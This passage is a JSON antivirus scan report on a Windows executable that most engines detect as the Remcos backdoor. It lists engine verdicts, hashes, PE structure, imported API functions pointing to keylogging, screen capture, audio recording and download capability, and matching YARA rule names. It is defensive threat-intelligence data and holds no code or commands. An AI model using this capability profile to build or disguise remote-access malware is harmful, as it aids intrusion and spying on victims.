          "engine_version": "v2021.2.0+4045",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "BehavesLike.Win32.FE_Backdoor_Win_REMCOS_.gh"
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.10",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "3.1.0.150",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Backdoor.Remcos"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5419",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Rescoms.Win32.2461"
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.22.3.0",
          "engine_update": "20250804",
          "category": "malicious",
          "result": "Trojan.Win32.Save.a"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.252.56618",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan ( 0053ac2c1 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "undetected",
          "result": null
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.252.56619",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan ( 0053ac2c1 )"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.1013",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Win32.Remcos.GEN"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.22.0.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "ML.Attribute.HighConfidence"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "31653",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "a variant of Win32/Rescoms.B"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.683",
          "engine_update": "20250804",
          "category": "malicious",
          "result": "Malicious"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan.Win32.VSX.PE04C9j"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.4.3.0",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Win.Trojan.Remcos-9841897-0"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "HEUR:Backdoor.Win32.Remcos.gen"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.170.26895",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan.Win32.Remcos.kzglxx"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Win32:MalwareX-gen [Rat]"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.28",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Backdoor.Remcos!1.BAC7 (CLASSIC)"
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "3.0.3.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1754551829",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Detected"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Backdoor.BDS/Backdoor.Gen"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.69.6040",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "BackDoor.Remcos.534"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "McAfeeD": {
          "method": "blacklist",
          "engine_name": "McAfeeD",
          "engine_version": "1.2.0.10275",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Real Protect-LS!B9E7831E2F18"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "25.1.1.1",
          "engine_update": "20250114",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.4.0",
          "engine_update": "20250721",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2024.8.0.61147",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384 (B)"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.4.16.0",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Win32.Remcos"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "GD:27.41336AVA:64.29607",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.9.0.8",
          "engine_update": "20250227",
          "category": "malicious",
          "result": "Win.Backdoor.Remcos"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.6.1.3",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "W32/Agent.JUB.gen!Eldorado"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.22",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "BDS/Backdoor.Gen"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.222.174",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "37936",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2025.0.0.23",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "6.18-106783209",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.25070.4",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.3.4",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.28.0.10568",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Backdoor/Win.Remcos.R715732"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20240328",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.3.2",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2025-08-07.02",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "3.0.0.0",
          "engine_update": "20250805",
          "category": "malicious",
          "result": "Unsafe"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trj/Genetic.gen"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan.Win32.Remcos.16001234"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "TrellixENS": {
          "method": "blacklist",
          "engine_name": "TrellixENS",
          "engine_version": "6.0.6.653",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "GenericRXSQ-HG!B9E7831E2F18"
        },
        "huorong": {
          "method": "blacklist",
          "engine_name": "huorong",
          "engine_version": "5483d89:5483d89:ef9f014:ef9f014",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Backdoor/Remcos.k"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan.Malware.300983.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "7.0.30.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "W32/Rescoms.B!tr"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Win32:MalwareX-gen [Rat]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "alibabacloud": {
          "method": "blacklist",
          "engine_name": "alibabacloud",
          "engine_version": "2.2.0",
          "engine_update": "20250321",
          "category": "malicious",
          "result": "Backdoor:Win/Remcos"
        },
        "google_safebrowsing": {
          "method": "blacklist",
          "engine_name": "google_safebrowsing",
          "engine_version": "1.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20250807",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20250124",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20250416",
          "category": "type-unsupported",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "250806-02",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        }
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "filecondis": {
        "raw_md5": "ad9c29a4e745ca1a517409ad2fe36c33",
        "dhash": "607c3c1c0e1d0404"
      },
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "info": "EXE32",
            "version": "2017 v.15.5-6",
            "type": "Compiler",
            "name": "EP:Microsoft Visual C/C++"
          },
          {
            "info": "LTCG/C++",
            "version": "19.16.27054",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "14.16.27054",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2017 version 15.9",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "first_submission_date": 1754556589,
      "meaningful_name": "/home/petik/ss/malware/2025-08-07_b9e7831e2f188c25a3a44a802a373234_amadey_black-basta_cobalt-strike_elex_luca-stealer_remcos",
      "popular_threat_classification": {
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 15,
            "value": "remcos"
          },
          {
            "count": 8,
            "value": "dacic"
          },
          {
            "count": 3,
            "value": "rescoms"
          }
        ],
        "suggested_threat_label": "trojan.remcos/dacic"
      },
      "pe_info": {
        "timestamp": 1753369582,
        "imphash": "78a3bdf3c5b9bd3972e77fa90dce8f2d",
        "machine_type": 332,
        "entry_point": 225227,
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "chi2": 80879.5,
            "filetype": "unknown",
            "entropy": 3.389878273010254,
            "sha256": "d8e086b038111b0d2ec2a284aa7464147507bbe42bf20905205482bb6b448fb4",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 198813.41,
            "filetype": "unknown",
            "entropy": 3.2519187927246094,
            "sha256": "5655775933efda1e38ae00f0b8f85f60955669ef9bec207ebb979ecc2cecbea4",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 394144.12,
            "filetype": "unknown",
            "entropy": 3.1357431411743164,
            "sha256": "5dd7bade4b5e9a2ddaa8dac9a1288d26c5f61c2aaa1abc1fbbbd7b970494855f",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 801182.88,
            "filetype": "unknown",
            "entropy": 3.389096260070801,
            "sha256": "12b3cf109f2818be4874ec08d906cd6c25b76a1ded8b026045e45f5ca690de91",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 246.31,
            "filetype": "unknown",
            "entropy": 7.764801979064941,
            "sha256": "2e222b141f83f08a2c735adbb414665c9793f35ddf4670f23af3a732e9cdeff0",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 4612.06,
            "filetype": "ICO",
            "entropy": 2.6230783462524414,
            "sha256": "ad4a5aad6219f3a1fce97f7b45e787ca6947e9af37c4ee39698934208aeffa45",
            "type": "RT_GROUP_ICON"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 1,
          "ENGLISH US": 5
        },
        "resource_types": {
          "RT_ICON": 4,
          "RT_GROUP_ICON": 1,
          "RT_RCDATA": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 1978391.5,
            "virtual_address": 4096,
            "entropy": 6.62,
            "raw_size": 363008,
            "flags": "rx",
            "virtual_size": 362593,
            "md5": "02717594422b0223c40fb4d4edef971a"
          },
          {
            "name": ".rdata",
            "chi2": 3175971.75,
            "virtual_address": 368640,
            "entropy": 5.76,
            "raw_size": 102912,
            "flags": "r",
            "virtual_size": 102886,
            "md5": "d4eedf28227fb5bbe03e411963f38612"
          },
          {
            "name": ".data",
            "chi2": 309054.16,
            "virtual_address": 475136,
            "entropy": 3.59,
            "raw_size": 3584,
            "flags": "rw",
            "virtual_size": 24516,
            "md5": "9a1229d7f9350db02cf0cf623ebff0d6"
          },
          {
            "name": ".rsrc",
            "chi2": 1434452.12,
            "virtual_address": 499712,
            "entropy": 3.83,
            "raw_size": 18944,
            "flags": "r",
            "virtual_size": 18724,
            "md5": "d5f95ac67a6158bae57602de53f50515"
          },
          {
            "name": ".reloc",
            "chi2": 71301.94,
            "virtual_address": 520192,
            "entropy": 6.66,
            "raw_size": 16384,
            "flags": "r",
            "virtual_size": 15924,
            "md5": "2ee94c7c76bf35adbd0296daa03d7b8a"
          }
        ],
        "compiler_product_versions": [
          "[C++] VS2008 SP1 build 30729 count=1",
          "[IMP] VS2008 SP1 build 30729 count=25",
          "[---] Unmarked objects count=323",
          "id: 0xf1, version: 40116 count=19",
          "id: 0xf3, version: 40116 count=171",
          "id: 0xf2, version: 40116 count=30",
          "id: 0xc7, version: 41118 count=2",
          "id: 0x105, version: 26706 count=62",
          "id: 0x104, version: 26706 count=33",
          "id: 0x103, version: 26706 count=26",
          "id: 0x109, version: 27054 count=109",
          "id: 0xff, version: 27054 count=1",
          "id: 0x102, version: 27054 count=1"
        ],
        "rich_pe_header_hash": "d8c4155fdb70a0a20cf8aa52790cce8e",
        "debug": [
          {
            "type_str": "IMAGE_DEBUG_TYPE_POGO",
            "timestamp": "Thu Jul 24 15:06:22 2025",
            "size": 920,
            "type": 13,
            "offset": 454432
          },
          {
            "type_str": "IMAGE_DEBUG_TYPE_ILTCG",
            "timestamp": "Thu Jul 24 15:06:22 2025",
            "size": 0,
            "type": 14,
            "offset": 0
          }
        ],
        "import_list": [
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "AllocConsole",
              "CloseHandle",
              "CompareStringW",
              "CopyFileW",
              "CreateDirectoryW",
              "CreateEventA",
              "CreateEventW",
              "CreateFileW",
              "CreateMutexA",
              "CreatePipe",
              "CreateProcessA",
              "CreateProcessW",
              "CreateThread",
              "CreateToolhelp32Snapshot",
              "DecodePointer",
              "DeleteCriticalSection",
              "DeleteFileA",
              "DeleteFileW",
              "EncodePointer",
              "EnterCriticalSection",
              "EnumSystemLocalesW",
              "ExitProcess",
              "ExitThread",
              "ExpandEnvironmentStringsA",
              "FindClose",
              "FindFirstFileA",
              "FindFirstFileExA",
              "FindFirstFileW",
              "FindFirstVolumeW",
              "FindNextFileA",
              "FindNextFileW",
              "FindNextVolumeW",
              "FindResourceA",
              "FindVolumeClose",
              "FlushFileBuffers",
              "FormatMessageA",
              "FormatMessageW",
              "FreeEnvironmentStringsW",
              "FreeLibrary",
              "GetACP",
              "GetCommandLineA",
              "GetCommandLineW",
              "GetConsoleCP",
              "GetConsoleMode",
              "GetConsoleScreenBufferInfo",
              "GetCPInfo",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetDateFormatW",
              "GetDriveTypeA",
              "GetEnvironmentStringsW",
              "GetFileAttributesW",
              "GetFileSize",
              "GetFileSizeEx",
              "GetFileType",
              "GetLastError",
              "GetLocaleInfoA",
              "GetLocaleInfoW",
              "GetLocalTime",
              "GetLogicalDriveStringsA",
              "GetLongPathNameW",
              "GetModuleFileNameA",
              "GetModuleFileNameW",
              "GetModuleHandleA",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetNativeSystemInfo",
              "GetOEMCP",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemDirectoryA",
              "GetSystemTimeAsFileTime",
              "GetTempFileNameW",
              "GetTempPathW",
              "GetThreadContext",
              "GetTickCount",
              "GetTimeFormatW",
              "GetTimeZoneInformation",
              "GetUserDefaultLCID",
              "GetVersionExW",
              "GetVolumePathNamesForVolumeNameW",
              "GlobalAlloc",
              "GlobalFree",
              "GlobalLock",
              "GlobalUnlock",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSection",
              "InitializeCriticalSectionAndSpinCount",
              "InitializeSListHead",
              "IsBadReadPtr",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "IsValidLocale",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryA",
              "LoadLibraryExW",
              "LoadLibraryW",
              "LoadResource",
              "LocalAlloc",
              "LocalFree",
              "LockResource",
              "lstrcatW",
              "lstrcmpW",
              "lstrcpynA",
              "lstrcpyW",
              "lstrlenA",
              "lstrlenW",
              "MoveFileExW",
              "MoveFileW",
              "MulDiv",
              "MultiByteToWideChar",
              "OpenMutexA",
              "OpenProcess",
              "PeekNamedPipe",
              "Process32FirstW",
              "Process32NextW",
              "QueryDosDeviceW",
              "QueryPerformanceCounter",
              "QueryPerformanceFrequency",
              "RaiseException",
              "ReadConsoleW",
              "ReadFile",
              "ReadProcessMemory",
              "RemoveDirectoryW",
              "ResetEvent",
              "ResumeThread",
              "RtlUnwind",
              "SetConsoleOutputCP",
              "SetConsoleTextAttribute",
              "SetEndOfFile",
              "SetEnvironmentVariableA",
              "SetEnvironmentVariableW",
              "SetEvent",
              "SetFileAttributesW",
              "SetFilePointer",
              "SetFilePointerEx",
              "SetLastError",
              "SetStdHandle",
              "SetThreadContext",
              "SetUnhandledExceptionFilter",
              "SizeofResource",
              "Sleep",
              "SwitchToThread",
              "TerminateProcess",
              "TerminateThread",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "VirtualAlloc",
              "VirtualFree",
              "VirtualProtect",
              "WaitForSingleObject",
              "WaitForSingleObjectEx",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile",
              "WriteProcessMemory"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "AppendMenuA",
              "CallNextHookEx",
              "CloseClipboard",
              "CloseWindow",
              "CreatePopupMenu",
              "CreateWindowExA",
              "DefWindowProcA",
              "DispatchMessageA",
              "DrawIcon",
              "EmptyClipboard",
              "EnumDisplaySettingsW",
              "EnumWindows",
              "ExitWindowsEx",
              "GetClipboardData",
              "GetCursorPos",
              "GetForegroundWindow",
              "GetIconInfo",
              "GetKeyboardLayout",
              "GetKeyboardLayoutNameA",
              "GetKeyboardState",
              "GetKeyState",
              "GetMessageA",
              "GetSystemMetrics",
              "GetWindowTextLengthW",
              "GetWindowTextW",
              "GetWindowThreadProcessId",
              "IsWindowVisible",
              "MapVirtualKeyA",
              "MessageBoxW",
              "mouse_event",
              "OpenClipboard",
              "RegisterClassExA",
              "SendInput",
              "SetClipboardData",
              "SetForegroundWindow",
              "SetWindowsHookExA",
              "SetWindowTextW",
              "ShowWindow",
              "SystemParametersInfoW",
              "ToUnicodeEx",
              "TrackPopupMenu",
              "TranslateMessage",
              "UnhookWindowsHookEx",
              "wsprintfW"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "BitBlt",
              "CreateCompatibleBitmap",
              "CreateCompatibleDC",
              "CreateDCA",
              "DeleteDC",
              "DeleteObject",
              "GetDIBits",
              "GetObjectA",
              "SelectObject",
              "StretchBlt"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "AdjustTokenPrivileges",
              "ChangeServiceConfigW",
              "CloseServiceHandle",
              "ControlService",
              "CryptAcquireContextA",
              "CryptGenRandom",
              "CryptReleaseContext",
              "EnumServicesStatusW",
              "GetTokenInformation",
              "GetUserNameW",
              "LookupPrivilegeValueA",
              "OpenProcessToken",
              "OpenSCManagerA",
              "OpenSCManagerW",
              "OpenServiceW",
              "QueryServiceConfigW",
              "QueryServiceStatus",
              "RegCloseKey",
              "RegCreateKeyA",
              "RegCreateKeyExW",
              "RegCreateKeyW",
              "RegDeleteKeyA",
              "RegDeleteValueW",
              "RegEnumKeyExA",
              "RegEnumKeyExW",
              "RegEnumValueW",
              "RegOpenKeyExA",
              "RegOpenKeyExW",
              "RegQueryInfoKeyW",
              "RegQueryValueExA",
              "RegQueryValueExW",
              "RegSetValueExA",
              "RegSetValueExW",
              "StartServiceW"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "ExtractIconA",
              "Shell_NotifyIconA",
              "ShellExecuteExA",
              "ShellExecuteW"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CoGetObject",
              "CoInitializeEx",
              "CoUninitialize"
            ]
          },
          {
            "library_name": "SHLWAPI.dll",
            "imported_functions": [
              "PathFileExistsA",
              "PathFileExistsW",
              "StrToIntA"
            ]
          },
          {
            "library_name": "WINMM.dll",
            "imported_functions": [
              "mciSendStringA",
              "mciSendStringW",
              "PlaySoundW",
              "waveInAddBuffer",
              "waveInClose",
              "waveInOpen",
              "waveInPrepareHeader",
              "waveInStart",
              "waveInStop",
              "waveInUnprepareHeader"
            ]
          },
          {
            "library_name": "WS2_32.dll",
            "imported_functions": [
              "closesocket",
              "connect",
              "gethostbyaddr",
              "gethostbyname",
              "getservbyname",
              "getservbyport",
              "htonl",
              "htons",
              "inet_addr",
              "inet_ntoa",
              "ntohs",
              "recv",
              "send",
              "socket",
              "WSAGetLastError",
              "WSASetLastError",
              "WSAStartup"
            ]
          },
          {
            "library_name": "urlmon.dll",
            "imported_functions": [
              "URLDownloadToFileW",
              "URLOpenBlockingStreamW"
            ]
          },
          {
            "library_name": "gdiplus.dll",
            "imported_functions": [
              "GdipAlloc",
              "GdipCloneImage",
              "GdipDisposeImage",
              "GdipFree",
              "GdipGetImageEncoders",
              "GdipGetImageEncodersSize",
              "GdipLoadImageFromStream",
              "GdiplusStartup",
              "GdipSaveImageToStream"
            ]
          },
          {
            "library_name": "WININET.dll",
            "imported_functions": [
              "InternetCloseHandle",
              "InternetOpenUrlW",
              "InternetOpenW",
              "InternetReadFile"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "type_extension": "exe",
      "last_modification_date": 1754560487,
      "last_submission_date": 1754556589,
      "last_analysis_date": 1754556589,
      "vhash": "055056655d15156225za00a87z37z403022c1z40a117z",
      "creation_date": 1753369582,
      "sha1": "4388382370bac4b6e8f59b0d6451c67f135f8d26",
      "size": 505856,
      "available_tools": [
        "capa"
      ],
      "sha256": "e26ce9a4659cba91652454d176122204d8718fda7944fd48adf853323562efc3",
      "magika": "PEBIN",
      "reputation": -11,
      "last_analysis_stats": {
        "malicious": 48,
        "suspicious": 0,
        "undetected": 25,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 40.3
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 19.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 17.2
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 7.7
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 7.6
        }
      ],
      "ssdeep": "12288:3vVTj8Zv1VG/V+vuwrBazq6vO6ieZt+sPZKW:/9ktVqV2Gq6vO6RZttZ",
      "crowdsourced_yara_results": [
        {
          "ruleset_id": "0084cef83c",
          "ruleset_version": "0084cef83c|6558c417dcf07146b1309b6acde6be0aa96dea10",
          "ruleset_name": "win.remcos_auto",
          "rule_name": "win_remcos_auto",
          "match_date": 1754556590,
          "description": "Detects win.remcos.",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "source": "https://malpedia.caad.fkie.fraunhofer.de/"
        },
        {
          "ruleset_id": "00b9c8c21b",
          "ruleset_version": "00b9c8c21b|b488c511a7c48ed6c425bf38811bf08e87b0ddbf",
          "ruleset_name": "Remcos",
          "rule_name": "Remcos",
          "match_date": 1754556590,
          "description": "Remcos Payload",
          "author": "kevoreilly",
          "source": "https://github.com/kevoreilly/CAPEv2"
        },
        {
          "ruleset_id": "015d30b1dc",
          "ruleset_version": "015d30b1dc|195c9611ddb90db599d7ffc1a9b0e8c45688007d",
          "ruleset_name": "Windows_Trojan_Remcos",
          "rule_name": "Windows_Trojan_Remcos_b296e965",
          "match_date": 1754556590,
          "author": "Elastic Security",
          "source": "https://github.com/elastic/protections-artifacts"
        },
        {
          "ruleset_id": "00c3b8eb5d",
          "ruleset_version": "00c3b8eb5d|e76c93dcdedff04076380ffc60ea54e45b313635",
          "ruleset_name": "indicator_suspicious",
